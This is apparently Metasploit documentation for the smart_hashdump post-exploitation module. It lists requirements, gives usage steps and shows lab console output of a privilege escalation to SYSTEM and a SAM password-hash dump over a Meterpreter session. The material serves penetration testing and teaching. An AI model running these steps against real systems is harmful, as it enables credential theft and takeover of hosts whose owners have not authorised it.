The post/windows/gather/smart_hashdump module dumps local accounts from the SAM database. If the target host is a Domain Controller, it will dump the Domain Account Database using the proper technique depending on privilege level, OS and role of the host.

Hashes will be saved to the meterpreter database in John the Ripper format for later use.

## Vulnerable Application

To be able to use post/windows/gather/smart_hashdump, you must meet these requirements:

* You are on a Meterpreter type session.
* The target is a Windows platform.
* It must be executed under the context of a high privilege account, such as SYSTEM.

## Verification Steps

1. Obtain a meterpreter shell on a Windows system, running as a highly privileged or SYSTEM user.
1. Load the module, `use post/windows/gather/smart_hashdump`
1. Specify the session, eg: `set SESSION 1`
1. If necessary, tell the module to attempt to elevate to SYSTEM first: `set GETSYSTEM true`
1. Run the module.

For example:
```
msf6 exploit(multi/handler) > use post/windows/gather/smart_hashdump
msf6 post(windows/gather/smart_hashdump) > show options

Module options (post/windows/gather/smart_hashdump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   GETSYSTEM  false            no        Attempt to get SYSTEM privilege on the target host.
   SESSION                     yes       The session to run this module on.

msf6 post(windows/gather/smart_hashdump) > set  SESSION 1
SESSION => 1
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against DESKTOP-G7A2R2R
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/kali/.msf4/loot/20201008121933_default_192.168.56.117_windows.hashes_338495.txt
[-] Insufficient privileges to dump hashes!
[*] Post module execution completed
msf6 post(windows/gather/smart_hashdump) > set GETSYSTEM true
GETSYSTEM => true
msf6 post(windows/gather/smart_hashdump) > run

[*] Running module against DESKTOP-G7A2R2R
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/kali/.msf4/loot/20201008122008_default_192.168.56.117_windows.hashes_353942.txt
[*] Dumping password hashes...
[*] Trying to get SYSTEM privilege
[+] Got SYSTEM privilege
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY 4934844cf0365459683ed18d9ebcb903...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[*]     No users with password hints on this system
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Post module execution completed
```


## Scenarios

**High Privilege Account**

Before using post/windows/gather/smart_hashdump, there is a possibility you need to escalate your privileges. This module features a `GETSYSTEM` option, which will attempt to elevate from a high privileged account to NT AUTHORITY\SYSTEM.

```
msf6 post(windows/gather/smart_hashdump) > set GETSYSTEM true
GETSYSTEM => true
```

Note that this will invoke Meterpreter's standard GetSystem feature prior to running the module, and it will affect the entire session. To demonstrate, a Meterpreter shell running as an administrator account:
```
  Session ID: 1
        Name:
        Type: meterpreter windows
        Info: DESKTOP-G7A2R2R\user @ DESKTOP-G7A2R2R
      Tunnel: 192.168.56.118:4444 -> 192.168.56.117:49680 (192.168.56.117)
         Via: exploit/multi/handler
   Encrypted: Yes (AES-256-CBC)
        UUID: bd2a0bae4a53009e/x86=1/windows=1/2020-10-08T03:42:16Z
     CheckIn: 4s ago @ 2020-10-08 12:52:17 +0900
  Registered: No
```

After invoking the `post/windows/gather/smart_hashdump` on the session with `GETSYSTEM` set to `true` will look like (see the example in Verification Steps):
```
  Session ID: 1
        Name:
        Type: meterpreter windows
        Info: NT AUTHORITY\SYSTEM @ DESKTOP-G7A2R2R
      Tunnel: 192.168.56.118:4444 -> 192.168.56.117:49680 (192.168.56.117)
         Via: exploit/multi/handler
   Encrypted: Yes (AES-256-CBC)
        UUID: bd2a0bae4a53009e/x86=1/windows=1/2020-10-08T03:42:16Z
     CheckIn: 0s ago @ 2020-10-08 12:55:12 +0900
  Registered: No

```
